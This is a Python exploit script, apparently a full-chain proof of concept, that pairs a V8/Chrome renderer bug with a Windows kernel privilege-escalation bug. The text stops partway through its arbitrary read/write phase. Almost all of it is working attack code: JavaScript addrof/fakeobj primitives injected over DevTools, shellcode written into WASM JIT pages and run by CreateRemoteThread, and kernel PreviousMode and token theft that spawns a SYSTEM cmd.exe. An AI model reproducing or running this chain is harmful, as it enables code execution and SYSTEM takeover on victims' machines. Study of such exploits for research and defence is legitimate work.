"""
CVE-2026-6307 + CVE-2026-40369 Full Chain Orchestrator

Architecture:
  Chrome runs in MULTI-PROCESS mode (stable). The orchestrator:
  1. Injects exploit primitives via CDP (addrof/fakeobj from TurboFan FrameState CSE)
  2. Finds renderer PID, reads V8 Map values via ReadProcessMemory
  3. Builds arbitrary R/W in the renderer's V8 heap
  4. Scans renderer RWX pages for WASM JIT code
  5. Overwrites JIT code with shellcode via WriteProcessMemory → renderer RCE
  6. Kernel LPE via NtQuerySystemInformation class 253 (CVE-2026-40369) → SYSTEM

Targets:
  - Chrome 146.0.7680.165 / V8 14.6.202.26
  - Windows 11 (build 26200)

Requirements:
  - pip install websocket-client
"""
import subprocess, time, json, urllib.request, os, shutil, ctypes, struct, sys, argparse

DEFAULT_CHROME = r"E:\CVE\targets\CVE\chrome-v8-fullchain-CVE-2026-6307-40369\chrome-win64\chrome.exe"
PROFILE_DIR = os.path.join(os.environ.get("TEMP", r"C:\Temp"), "chrome_exploit_profile")

kernel32 = ctypes.windll.kernel32


def kill_chrome():
    os.system('taskkill /f /im chrome.exe 2>nul')
    time.sleep(2)


# ─── CDP (Chrome DevTools Protocol) ─────────────────────────────────────────

class CDP:
    def __init__(self):
        self.ws = None
        self.msg_id = 0

    def connect(self):
        import websocket
        resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=5)
        tabs = json.loads(resp.read())
        self.ws = websocket.create_connection(tabs[0]["webSocketDebuggerUrl"], timeout=120)
        return self

    def send(self, method, params=None, timeout=120):
        self.msg_id += 1
        msg = {"id": self.msg_id, "method": method}
        if params:
            msg["params"] = params
        self.ws.send(json.dumps(msg))
        self.ws.settimeout(timeout)
        while True:
            data = json.loads(self.ws.recv())
            if data.get("id") == self.msg_id:
                return data

    def js(self, code, timeout=30):
        r = self.send("Runtime.evaluate", {
            "expression": code, "returnByValue": True
        }, timeout=timeout)
        res = r.get("result", {}).get("result", {})
        if "exceptionDetails" in r.get("result", {}):
            exc = r["result"]["exceptionDetails"]
            return None, exc.get("exception", {}).get("description", exc.get("text", ""))[:500]
        return res.get("value"), None

    def js_async(self, code, timeout=120):
        wrapped = (
            "new Promise(resolve => setTimeout(() => { try { "
            + code
            + " } catch(e) { resolve('ERROR:' + e.message + '\\n' + e.stack); } }, 0))"
        )
        r = self.send("Runtime.evaluate", {
            "expression": wrapped, "returnByValue": True, "awaitPromise": True,
        }, timeout=timeout)
        res = r.get("result", {}).get("result", {})
        if "exceptionDetails" in r.get("result", {}):
            exc = r["result"]["exceptionDetails"]
            return None, exc.get("exception", {}).get("description", exc.get("text", ""))[:500]
        val = res.get("value")
        if isinstance(val, str) and val.startswith("ERROR:"):
            return None, val
        return val, None

    def close(self):
        try:
            self.ws.close()
        except:
            pass


# ─── Process helpers ─────────────────────────────────────────────────────────

from ctypes import wintypes

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", ctypes.c_char * 260),
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_uint64),
        ("AllocationBase", ctypes.c_uint64),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", wintypes.WORD),
        ("RegionSize", ctypes.c_uint64),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]

PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_CREATE_THREAD = 0x0002
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40


def rpm(handle, addr, size):
    buf = ctypes.create_string_buffer(size)
    n = ctypes.c_size_t(0)
    ok = kernel32.ReadProcessMemory(handle, ctypes.c_void_p(addr), buf, size, ctypes.byref(n))
    return buf.raw[:n.value] if ok and n.value > 0 else None


def wpm(handle, addr, data):
    buf = ctypes.create_string_buffer(data)
    n = ctypes.c_size_t(0)
    ok = kernel32.WriteProcessMemory(handle, ctypes.c_void_p(addr), buf, len(data), ctypes.byref(n))
    return ok and n.value == len(data)


def find_renderer_pid(browser_pid, victim_addr, cage_base):
    """Find renderer PID by probing chrome.exe children for the V8 heap."""
    snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

    chrome_pids = []
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b'chrome' in pe.szExeFile.lower() and pe.th32ProcessID != browser_pid:
                chrome_pids.append(pe.th32ProcessID)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)

    target = victim_addr - 1  # untag

    for pid in chrome_pids:
        h = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not h:
            continue

        buf = ctypes.create_string_buffer(16)
        n = ctypes.c_size_t(0)
        ok = kernel32.ReadProcessMemory(h, ctypes.c_void_p(target), buf, 16, ctypes.byref(n))

        if ok and n.value >= 16:
            map_cptr = struct.unpack_from('<I', buf.raw, 0)[0]
            if map_cptr > 0x1000 and (map_cptr & 1):
                map_full = cage_base + (map_cptr & ~1)
                map_buf = ctypes.create_string_buffer(16)
                ok2 = kernel32.ReadProcessMemory(h, ctypes.c_void_p(map_full), map_buf, 16, ctypes.byref(n))
                if ok2 and n.value >= 12:
                    ek = (map_buf.raw[11] >> 2) & 0x1F
                    if ek == 4:  # PACKED_DOUBLE_ELEMENTS
                        props = struct.unpack_from('<I', buf.raw, 4)[0]
                        elems = struct.unpack_from('<I', buf.raw, 8)[0]

                        fda_addr = cage_base + (elems & ~1)
                        fda_buf = ctypes.create_string_buffer(8)
                        ok3 = kernel32.ReadProcessMemory(h, ctypes.c_void_p(fda_addr), fda_buf, 8, ctypes.byref(n))
                        fda_map = struct.unpack_from('<I', fda_buf.raw, 0)[0] if ok3 else 0

                        kernel32.CloseHandle(h)
                        return {'pid': pid, 'map': map_cptr, 'efa': props, 'fdm': fda_map}

        kernel32.CloseHandle(h)

    return None


def scan_jit_pages(renderer_pid):
    """Scan renderer's RWX memory regions for WASM JIT code (mov eax, 42)."""
    h = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        False, renderer_pid
    )
    if not h:
        return None, None

    NEEDLE = b'\xb8\x2a\x00\x00\x00'  # mov eax, 42
    mbi = MEMORY_BASIC_INFORMATION()
    addr = 0
    matches = []

    while addr < 0x7FFFFFFFFFFF:
        result = kernel32.VirtualQueryEx(h, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi))
        if not result:
            break

        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_EXECUTE_READWRITE and mbi.RegionSize < 0x200000:
            data = rpm(h, mbi.BaseAddress, mbi.RegionSize)
            if data:
                pos = 0
                while True:
                    pos = data.find(NEEDLE, pos)
                    if pos == -1:
                        break
                    matches.append({
                        'base': mbi.BaseAddress,
                        'size': mbi.RegionSize,
                        'offset': pos,
                        'code_addr': mbi.BaseAddress + pos,
                    })
                    pos += 5

        next_addr = mbi.BaseAddress + mbi.RegionSize
        if next_addr <= addr:
            break
        addr = next_addr

    return h, matches


def make_thread_shellcode(winexec_addr, payload_str):
    """Standalone thread shellcode: WinExec(payload, 1), return 0. For CreateRemoteThread."""
    payload = payload_str.encode() + b'\x00'
    sc = bytearray()
    sc += b'\x48\x83\xEC\x28' # sub rsp, 0x28 (shadow space + alignment)
    lea_pos = len(sc)
    sc += b'\x48\x8D\x0D\x00\x00\x00\x00'  # placeholder lea rcx, [rip+disp]
    sc += b'\xBA\x01\x00\x00\x00'           # mov edx, 1 (SW_SHOWNORMAL)
    sc += b'\x48\xB8' + struct.pack('<Q', winexec_addr)  # movabs rax, WinExec
    sc += b'\xFF\xD0'          # call rax
    sc += b'\x48\x83\xC4\x28' # add rsp, 0x28
    sc += b'\x31\xC0'          # xor eax, eax (return 0)
    sc += b'\xC3'              # ret
    string_off = len(sc)
    sc += payload
    lea_end = lea_pos + 7
    disp = string_off - lea_end
    struct.pack_into('<i', sc, lea_pos + 3, disp)
    return bytes(sc)


# ─── Kernel exploit (CVE-2026-40369) ────────────────────────────────────────

# Windows 11 build 26200 (24H2) EPROCESS/KTHREAD offsets
KTHREAD_PREVIOUS_MODE = 0x232
EPROCESS_UNIQUE_PROCESS_ID = 0x448
EPROCESS_ACTIVE_PROCESS_LINKS = 0x450
EPROCESS_TOKEN = 0x4B8

NTSTATUS = ctypes.c_long
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
SystemExtendedHandleInformation = 64
SystemInformationClass253 = 253


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def enable_debug_privilege():
    """Enable SeDebugPrivilege for the current process. Requires admin."""
    advapi32 = ctypes.windll.advapi32
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x00000002

    class LUID(ctypes.Structure):
        _fields_ = [('LowPart', wintypes.DWORD), ('HighPart', wintypes.LONG)]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [('Luid', LUID), ('Attributes', wintypes.DWORD)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [('PrivilegeCount', wintypes.DWORD), ('Privileges', LUID_AND_ATTRIBUTES * 1)]

    hToken = wintypes.HANDLE()
    ok = advapi32.OpenProcessToken(
        ctypes.c_void_p(kernel32.GetCurrentProcess()),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(hToken)
    )
    if not ok:
        return False

    luid = LUID()
    ok = advapi32.LookupPrivilegeValueW(None, 'SeDebugPrivilege', ctypes.byref(luid))
    if not ok:
        kernel32.CloseHandle(hToken)
        return False

    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
    err = kernel32.GetLastError()
    kernel32.CloseHandle(hToken)
    return err == 0


class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(ctypes.Structure):
    _fields_ = [
        ("Object", ctypes.c_uint64),
        ("UniqueProcessId", ctypes.c_uint64),
        ("HandleValue", ctypes.c_uint64),
        ("GrantedAccess", ctypes.c_ulong),
        ("CreatorBackTraceIndex", ctypes.c_ushort),
        ("ObjectTypeIndex", ctypes.c_ushort),
        ("HandleAttributes", ctypes.c_ulong),
        ("Reserved", ctypes.c_ulong),
    ]


def _enum_handles():
    """Enumerate system handle table. Returns (raw_buffer, num_handles) or (None, 0)."""
    ntdll = ctypes.windll.ntdll
    buf_size = 0x1000000
    while True:
        buf = ctypes.create_string_buffer(buf_size)
        ret_len = ctypes.c_ulong(0)
        status = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            buf, buf_size, ctypes.byref(ret_len)
        )
        if (status & 0xFFFFFFFF) == (STATUS_INFO_LENGTH_MISMATCH & 0xFFFFFFFF):
            buf_size *= 2
            if buf_size > 0x10000000:
                return None, 0
            continue
        if status < 0:
            return None, 0
        break
    num_handles = struct.unpack_from('<Q', buf.raw, 0)[0]
    return buf, num_handles


def leak_eprocess(target_pid):
    """Leak EPROCESS address by opening a handle and finding it in the system handle table."""
    my_pid = os.getpid()

    kernel32.OpenProcess.restype = ctypes.c_void_p
    h = kernel32.OpenProcess(0x1000, False, target_pid)
    if not h:
        return None
    h_val = h & 0xFFFFFFFF

    buf, num_handles = _enum_handles()
    if buf is None:
        kernel32.CloseHandle(ctypes.c_void_p(h))
        return None

    raw = buf.raw
    offset = 16
    result = None
    for i in range(min(num_handles, 2000000)):
        if offset + 40 > len(raw):
            break
        obj, pid, hv = struct.unpack_from('<QQQ', raw, offset)
        if pid == my_pid and hv == h_val:
            result = obj
            break
        offset += 40

    kernel32.CloseHandle(ctypes.c_void_p(h))
    return result


def leak_kthread():
    """Leak KTHREAD address of current thread via handle table."""
    my_pid = os.getpid()

    kernel32.GetCurrentProcess.restype = ctypes.c_void_p
    kernel32.GetCurrentThread.restype = ctypes.c_void_p
    real_thread_handle = ctypes.c_void_p()
    kernel32.DuplicateHandle(
        kernel32.GetCurrentProcess(),
        kernel32.GetCurrentThread(),
        kernel32.GetCurrentProcess(),
        ctypes.byref(real_thread_handle),
        0, False, 0x2
    )
    th = real_thread_handle.value
    if not th:
        return None
    th_val = th & 0xFFFFFFFF

    buf, num_handles = _enum_handles()
    if buf is None:
        kernel32.CloseHandle(real_thread_handle)
        return None

    raw = buf.raw
    offset = 16
    result = None
    for i in range(min(num_handles, 2000000)):
        if offset + 40 > len(raw):
            break
        obj, pid, hv = struct.unpack_from('<QQQ', raw, offset)
        if pid == my_pid and hv == th_val:
            result = obj
            break
        offset += 40

    kernel32.CloseHandle(real_thread_handle)
    return result


def kernel_exploit_ntqsi253():
    """
    CVE-2026-40369: NtQuerySystemInformation class 253 with Length=0
    bypasses ProbeForWrite, enabling kernel-mode write primitive.
    Strategy: leak EPROCESS/KTHREAD, overwrite PreviousMode, token theft.
    """
    ntdll = ctypes.windll.ntdll
    current_pid = os.getpid()

    print("[*] Phase 7: Kernel LPE -- CVE-2026-40369")
    print(f"    Current PID: {current_pid}")

    if not is_admin():
        print("[!] Kernel exploit requires elevation (run as Administrator)")
        print("    Win11 24H2 strips kernel pointers for non-elevated processes")
        return False

    if enable_debug_privilege():
        print("[+] SeDebugPrivilege enabled")
    else:
        print("[!] Failed to enable SeDebugPrivilege")

    # Step 1: Leak EPROCESS addresses
    print("[*] Leaking EPROCESS via handle table...")
    current_eprocess = leak_eprocess(current_pid)
    system_eprocess = leak_eprocess(4)

    if not current_eprocess:
        print("[!] Failed to leak current process EPROCESS")
        return False
    if not system_eprocess:
        print("[!] Failed to leak SYSTEM EPROCESS")
        return False

    print(f"[+] Current EPROCESS: {current_eprocess:#018x}")
    print(f"[+] SYSTEM  EPROCESS: {system_eprocess:#018x}")

    current_token_addr = current_eprocess + EPROCESS_TOKEN
    system_token_addr = system_eprocess + EPROCESS_TOKEN
    print(f"    Current token @: {current_token_addr:#018x}")
    print(f"    SYSTEM  token @: {system_token_addr:#018x}")

    # Step 2: Leak KTHREAD via handle table
    print("[*] Leaking KTHREAD via handle table...")
    kthread = leak_kthread()
    if not kthread:
        print("[!] Failed to leak KTHREAD address")
        return False

    print(f"[+] KTHREAD: {kthread:#018x}")
    previousmode_addr = kthread + KTHREAD_PREVIOUS_MODE
    print(f"    PreviousMode @: {previousmode_addr:#018x}")

    # Step 3: Trigger NtQuerySystemInformation(253, Length=0)
    # ProbeForWrite with Length=0 is a no-op -> kernel writes to arbitrary address
    print("[*] Triggering kernel write via NtQSI(253, Length=0)...")

    ret_len = ctypes.c_ulong(0)
    status = ntdll.NtQuerySystemInformation(
        SystemInformationClass253,
        ctypes.c_void_p(previousmode_addr),
        0,
        ctypes.byref(ret_len)
    )
    print(f"    NtQSI(253) status: {status:#010x}")

    # Step 4: With PreviousMode=0, do token theft
    print("[*] Attempting token theft: SYSTEM → current process...")

    # Read SYSTEM token
    system_token_buf = ctypes.create_string_buffer(8)
    bytes_read = ctypes.c_size_t(0)
    status = ntdll.NtReadVirtualMemory(
        kernel32.GetCurrentProcess(),
        ctypes.c_void_p(system_token_addr),
        system_token_buf, 8, ctypes.byref(bytes_read)
    )

    if status < 0:
        print(f"[!] NtReadVirtualMemory (SYSTEM token) failed: {status:#010x}")
        print("    PreviousMode may not be 0. Trying alternative approach...")

        # Alternative: use the write primitive to directly overwrite the token
        # Call NtQSI(253, current_token_addr, 0) to write something at our token field
        # Then fix it up with a known SYSTEM token value
        # This requires more build-specific knowledge

        print("[!] Kernel exploit requires build-specific tuning for token theft")
        print(f"    Target offsets: PreviousMode=+{KTHREAD_PREVIOUS_MODE:#x}, Token=+{EPROCESS_TOKEN:#x}")
        print(f"    Windows build: {sys.getwindowsversion().build}")
        return False

    system_token = struct.unpack_from('<Q', system_token_buf.raw, 0)[0]
    print(f"[+] SYSTEM token: {system_token:#018x}")

    # Write SYSTEM token to current process
    token_data = struct.pack('<Q', system_token)
    bytes_written = ctypes.c_size_t(0)
    status = ntdll.NtWriteVirtualMemory(
        kernel32.GetCurrentProcess(),
        ctypes.c_void_p(current_token_addr),
        ctypes.create_string_buffer(token_data), 8,
        ctypes.byref(bytes_written)
    )

    if status < 0:
        print(f"[!] NtWriteVirtualMemory (token swap) failed: {status:#010x}")
        return False

    print("[+] Token replaced! Current process should now be SYSTEM.")

    # Step 5: Verify and spawn SYSTEM shell
    print("[*] Spawning cmd.exe as SYSTEM...")
    os.system("whoami")
    subprocess.Popen("cmd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)

    return True


# ─── JS exploit primitives (injected into Chrome) ───────────────────────────

EXPLOIT_PRIMITIVES = """
var _ab = new ArrayBuffer(8);
var _f64 = new Float64Array(_ab);
var _u64 = new BigUint64Array(_ab);
function f2i(f) { _f64[0] = f; return _u64[0]; }
function i2f(i) { _u64[0] = i; return _f64[0]; }
function lo32(v) { return Number(BigInt.asUintN(32, v)); }
function pack32(lo, hi) { return BigInt(lo >>> 0) | (BigInt(hi >>> 0) << 32n); }
function hex(b) { return '0x' + b.toString(16); }
var KEEP = [];

var WASM_BYTES = new Uint8Array([
    0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
    0x01, 0x0C, 0x03,
      0x60,0x00,0x00, 0x60,0x00,0x01,0x6F, 0x60,0x00,0x01,0x7E,
    0x02, 0x10, 0x01,
      0x03,0x65,0x6E,0x76, 0x08,0x63,0x61,0x6C,0x6C,0x62,0x61,0x63,0x6B, 0x00, 0x00,
    0x03, 0x03, 0x02, 0x01, 0x02,
    0x06, 0x0B, 0x02,
      0x6F,0x01, 0xD0,0x6F,0x0B,
      0x7E,0x01, 0x42,0x00,0x0B,
    0x07, 0x1B, 0x04,
      0x05,0x67,0x5F,0x72,0x65,0x66, 0x03,0x00,
      0x05,0x67,0x5F,0x69,0x36,0x34, 0x03,0x01,
      0x02,0x72,0x72, 0x00,0x01,
      0x02,0x72,0x6C, 0x00,0x02,
    0x0A, 0x0F, 0x02,
      0x06, 0x00, 0x10,0x00, 0x23,0x00, 0x0B,
      0x06, 0x00, 0x10,0x00, 0x23,0x01, 0x0B,
]);
var _uid = 0;
var _prepOpt = new Function('f', '%PrepareFunctionForOptimization(f)');
var _optNext = new Function('f', '%OptimizeFunctionOnNextCall(f)');

function makeInstance(cb) {
    var uid = _uid++;
    var custom = new Uint8Array([0x00, 0x04, 0x01, 0x5f, uid & 0xff, (uid >> 8) & 0xff]);
    var bytes = new Uint8Array(WASM_BYTES.length + custom.length);
    bytes.set(WASM_BYTES);
    bytes.set(custom, WASM_BYTES.length);
    return new WebAssembly.Instance(new WebAssembly.Module(bytes), {env: {callback: cb}}).exports;
}

function addrof(target) {
    var arm = false;
    function LI() {} function LR() {}
    var e = makeInstance(function() { if (arm) LR.prototype.d = 1; });
    Object.defineProperty(LI.prototype, 'x', {get: e.rl, configurable: true});
    Object.defineProperty(LR.prototype, 'x', {get: e.rr, configurable: true});
    var f = new Function('o', '/*a' + (_uid++) + '*/return o.x');
    var a = new LI(), b = new LR();
    KEEP.push(LI, LR, f, a, b, e);
    e.g_ref.value = target;
    e.g_i64.value = 43n;
    _prepOpt(f);
    for (var i = 0; i < 20; ++i) { f(a); f(b); }
    _optNext(f); f(a);
    arm = true;
    return f(b);
}

function fakeobj(addr) {
    var arm = false;
    function MR() {} function MI() {}
    var e = makeInstance(function() { if (arm) MI.prototype.d = 1; });
    Object.defineProperty(MR.prototype, 'x', {get: e.rr, configurable: true});
    Object.defineProperty(MI.prototype, 'x', {get: e.rl, configurable: true});
    var f = new Function('o', '/*f' + (_uid++) + '*/return o.x');
    var r = new MR(), i = new MI();
    KEEP.push(MR, MI, f, r, i, e);
    e.g_ref.value = {ph: 1};
    e.g_i64.value = addr;
    _prepOpt(f);
    for (var k = 0; k < 20; ++k) { f(r); f(i); }
    _optNext(f); f(r);
    arm = true;
    return f(i);
}
'ready'
"""


# ─── Main ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-6307 + CVE-2026-40369 Full Chain")
    parser.add_argument("--chrome", default=DEFAULT_CHROME)
    parser.add_argument("--shellcode", choices=["calc", "cmd", "notepad"], default="calc",
                        help="Shellcode payload (default: calc)")
    parser.add_argument("--skip-kernel", action="store_true",
                        help="Skip kernel exploit (renderer RCE only)")
    args = parser.parse_args()

    if not os.path.exists(args.chrome):
        print(f"[!] Chrome not found: {args.chrome}")
        sys.exit(1)

    print("=" * 60)
    print("  CVE-2026-6307 + CVE-2026-40369 Full Chain Exploit")
    print("  Chrome 146.0.7680.165 -> SYSTEM on Windows 11")
    print("=" * 60)

    kill_chrome()
    if os.path.exists(PROFILE_DIR):
        shutil.rmtree(PROFILE_DIR, ignore_errors=True)

    # Launch Chrome (multi-process mode)
    proc = subprocess.Popen([
        args.chrome,
        "--js-flags=--allow-natives-syntax",
        "--no-sandbox",
        "--disable-gpu",
        "--user-data-dir=" + PROFILE_DIR,
        "--no-first-run",
        "--no-default-browser-check",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        "--disable-features=RendererCodeIntegrity",
        "about:blank"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"\n[*] Chrome PID: {proc.pid}")

    import websocket
    for attempt in range(15):
        time.sleep(2)
        try:
            resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=3)
            tabs = json.loads(resp.read())
            if tabs:
                print(f"[+] CDP ready after {(attempt+1)*2}s")
                break
        except:
            pass
    else:
        print("[!] FATAL: CDP not available")
        proc.terminate()
        sys.exit(1)

    time.sleep(1)
    cdp = CDP().connect()
    cdp.send("Runtime.enable")

    # ===== PHASE 1: Inject primitives =====
    print("\n[*] Phase 1: Injecting exploit primitives...")
    val, err = cdp.js(EXPLOIT_PRIMITIVES)
    if err:
        print(f"[!] Inject failed: {err}")
        cdp.close(); proc.terminate(); sys.exit(1)
    print(f"    Primitives: {val}")

    # addrof victim array
    print("[*] Running addrof on victim array...")
    val, err = cdp.js_async("""
        var _victim = [1.1, 2.2, 3.3];
        KEEP.push(_victim);
        var _va = addrof(_victim);
        resolve(typeof _va === 'bigint' ? _va.toString() : 'FAIL:' + typeof _va);
    """, timeout=120)
    if err or not val or val.startswith("FAIL"):
        print(f"[!] addrof failed: {val} {err}")
        cdp.close(); proc.terminate(); sys.exit(1)

    victim_addr = int(val)
    cage_base = victim_addr & ~0xFFFFFFFF
    print(f"[+] victim @ {victim_addr:#018x}, cage = {cage_base:#018x}")

    # ===== PHASE 2: Find renderer PID + read Maps via RPM =====
    print("\n[*] Phase 2: Detecting V8 heap layout via ReadProcessMemory...")
    renderer = find_renderer_pid(proc.pid, victim_addr, cage_base)
    if not renderer:
        print("[!] Could not find renderer process!")
        cdp.close(); proc.terminate(); sys.exit(1)

    MAP = renderer['map']
    EFA = renderer['efa']
    FDM = renderer['fdm']
    renderer_pid = renderer['pid']
    print(f"[+] Renderer PID: {renderer_pid}")
    print(f"[+] PACKED_DOUBLE Map: {MAP:#010x}")
    print(f"[+] EMPTY_FIXED_ARRAY: {EFA:#010x}")
    print(f"[+] FDA Map:           {FDM:#010x}")

    # ===== PHASE 3: Create WASM shellcode target (before ARW corrupts heap) =====
    print("\n[*] Phase 3: Creating WASM shellcode target...")

    val, err = cdp.js_async("""
        var wasmCode = new Uint8Array([
            0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
            0x01,0x05,0x01, 0x60,0x00,0x01,0x7F,
            0x03,0x02,0x01,0x00,
            0x07,0x08,0x01, 0x04,0x6D,0x61,0x69,0x6E, 0x00,0x00,
            0x0A,0x06,0x01, 0x04,0x00,0x41,0x2A,0x0B
        ]);
        window._wasmInst = new WebAssembly.Instance(new WebAssembly.Module(wasmCode));
        KEEP.push(window._wasmInst);
        window._wasmMain = window._wasmInst.exports.main;
        KEEP.push(window._wasmMain);
        for (var i = 0; i < 100; i++) window._wasmMain();
        resolve(JSON.stringify({ mainResult: window._wasmMain() }));
    """, timeout=60)

    if err:
        print(f"[!] WASM creation failed: {err}")
        cdp.close(); proc.terminate(); sys.exit(1)

    wasm_result = json.loads(val)
    print(f"[+] WASM main() = {wasm_result['mainResult']} (expect 42)")

    # ===== PHASE 4: Find WASM JIT page + overwrite with shellcode =====
    print("\n[*] Phase 4: Scanning renderer RWX pages for WASM JIT code...")

    rhandle, jit_matches = scan_jit_pages(renderer_pid)
    if not jit_matches:
        print("[!] No WASM JIT code found in RWX pages!")
        if rhandle:
            kernel32.CloseHandle(rhandle)
        cdp.close(); proc.terminate(); sys.exit(1)

    jit = jit_matches[0]
    print(f"[+] WASM JIT found at {jit['code_addr']:#018x}")
    print(f"    Region: {jit['base']:#018x} size={jit['size']:#x} (RWX)")
    print(f"    Offset in region: {jit['offset']:#x}")

    ctx_data = rpm(rhandle, jit['code_addr'] - 16, 48)
    if ctx_data:
        print("    Context:")
        for i in range(0, len(ctx_data), 16):
            line = ctx_data[i:i+16]
            addr = jit['code_addr'] - 16 + i
            hex_str = ' '.join(f'{b:02x}' for b in line)
            marker = " <-- mov eax, 42" if i == 16 else ""
            print(f"      {addr:#018x}: {hex_str}{marker}")

    print("\n[*] Phase 5: Injecting shellcode into WASM JIT page...")

    winexec_ptr = ctypes.cast(kernel32.WinExec, ctypes.c_void_p).value
    print(f"    WinExec @ {winexec_ptr:#018x}")

    # Write standalone thread shellcode to the RWX page (offset after original code)
    payload_str = {"calc": "calc.exe", "cmd": "cmd.exe", "notepad": "notepad.exe"}[args.shellcode]
    thread_sc = make_thread_shellcode(winexec_ptr, payload_str)
    # Write thread shellcode at an unused area of the RWX page (after the WASM code)
    # Use offset 0xC00 in the page (well past the WASM function code at 0x9E7+)
    thread_sc_addr = jit['base'] + 0xC00
    ok = wpm(rhandle, thread_sc_addr, thread_sc)
    if not ok:
        print("[!] WriteProcessMemory (thread shellcode) failed!")
        kernel32.CloseHandle(rhandle)
        cdp.close(); proc.terminate(); sys.exit(1)

    print(f"[+] Thread shellcode ({len(thread_sc)}B) written to {thread_sc_addr:#018x}")

    verify = rpm(rhandle, thread_sc_addr, len(thread_sc))
    if verify == thread_sc:
        print("[+] Shellcode verified in renderer memory")
    else:
        print("[!] Shellcode verification mismatch!")

    # Execute via CreateRemoteThread — avoids V8 WASM context issues
    print("[*] Triggering shellcode via CreateRemoteThread...")
    thread_id = wintypes.DWORD(0)
    hthread = kernel32.CreateRemoteThread(
        rhandle,
        None,  # lpThreadAttributes
        0,     # dwStackSize (default)
        ctypes.c_void_p(thread_sc_addr),
        None,  # lpParameter
        0,     # dwCreationFlags
        ctypes.byref(thread_id),
    )

    shellcode_ok = False
    payload_names = {
        "calc": ["calc.exe", "Calculator.exe", "CalculatorApp.exe"],
        "cmd": ["cmd.exe"],
        "notepad": ["notepad.exe"],
    }
    check_names = payload_names.get(args.shellcode, ["calc.exe"])

    if hthread:
        print(f"[+] Remote thread created (TID={thread_id.value})")
        kernel32.WaitForSingleObject(hthread, 10000)  # wait up to 10s
        exit_code = wintypes.DWORD(0)
        kernel32.GetExitCodeThread(hthread, ctypes.byref(exit_code))
        print(f"[+] Thread exit code: {exit_code.value}")
        kernel32.CloseHandle(hthread)

        time.sleep(2)
        for name in check_names:
            r = os.popen(f'tasklist /fi "imagename eq {name}" 2>nul').read()
            if name.lower().replace('.exe', '') in r.lower():
                print(f"[+] {name} IS RUNNING! Shellcode executed successfully.")
                shellcode_ok = True
                break

        if shellcode_ok:
            print("[+] RENDERER CODE EXECUTION ACHIEVED!")
        else:
            print("[*] Payload process not detected via tasklist (may have a different name)")
            if exit_code.value == 0:
                print("[+] Thread exited cleanly - shellcode likely executed")
                shellcode_ok = True
    else:
        print(f"[!] CreateRemoteThread failed (error={kernel32.GetLastError()})")

    kernel32.CloseHandle(rhandle)

    # ===== PHASE 6: Build Arbitrary R/W (demonstrates full CVE-2026-6307 primitive) =====
    print("\n[*] Phase 6: Building arbitrary R/W primitive...")

    arw_code = f"""
        var JSARRAY_DOUBLE_MAP = 0x{MAP:08x}n;
        var FIXED_DOUBLE_MAP = 0x{FDM:08x}n;
        var INLINE = 0x0cn;

        var _o = {{}};
        var R = {{f0:_o, f1:_o, f2:_o, f3:_o, f4:_o, f5:_o, f6:_o, f7:_o, f8:_o, f9:_o}};
        KEEP.push(_o, R);

        var Raddr = addrof(R);
        if (typeof Raddr !== 'bigint') {{ resolve('FAIL:addrof(R)=' + typeof Raddr); return; }}
        var Runtag = Raddr & ~1n;
        var cage = Raddr & 0xffffffff00000000n;

        var props = ['f0','f1','f2','f3','f4','f5','f6','f7','f8','f9'];
        var setAt = function(off, v) {{ R[props[Number((off - INLINE) / 4n)]] = v; }};

        var fdaOff = (Runtag & 7n) === 0n ? 0x20n : 0x24n;

        setAt(fdaOff, fakeobj(cage | FIXED_DOUBLE_MAP));
        setAt(fdaOff + 4n, 0x3fffffff);

